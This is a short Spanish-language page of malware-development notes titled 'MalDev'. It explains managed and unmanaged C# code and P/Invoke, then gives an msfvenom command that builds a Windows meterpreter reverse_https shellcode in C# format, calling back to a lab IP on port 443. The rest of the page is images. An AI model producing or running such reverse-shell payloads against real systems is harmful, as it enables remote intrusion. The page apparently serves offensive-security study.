---
description: Compilado de técnicas en C#
---

# MalDev

## Unmanaged Code

C# es un lenguaje de alto nivel y genera un bytecode en el momento de la compilación. Además, también proporciona características para ejecutar código inseguro como pointers, pero que también está en un alto nivel si se compila el código con C # Compiler (csc.exe). Este tipo de código en Windows se llama managed code, donde toda la gestión de memoria es manejada por el CLR(Common Language Runtime).

Además,  C# es un lenguaje muy flexible y permite llamar a la función definida en las DLL del código fuente que no está escrito en C#. Este tipo de código se conoce como unmanaged code. A diferencia del managed code, el desarrollador es responsable del manejo de los recursos.

Para utilizar el unmanaged code, deberemos importar librerias que nos permitan esto. Por lo que haremos uso de P/Invoke para este paso. Por ejemplo para la funcion VirtualAlloc que está escrita en C, la podemos importar de la siguiente forma (eligiendo una de las tres):

<figure><img src="../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

## Crear el shellcode

```
msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.182.128 lport=443 -f csharp -o shellcode.cs 
```

<figure><img src="../../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

**Otros tipos de payloads en msfvenom:**

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
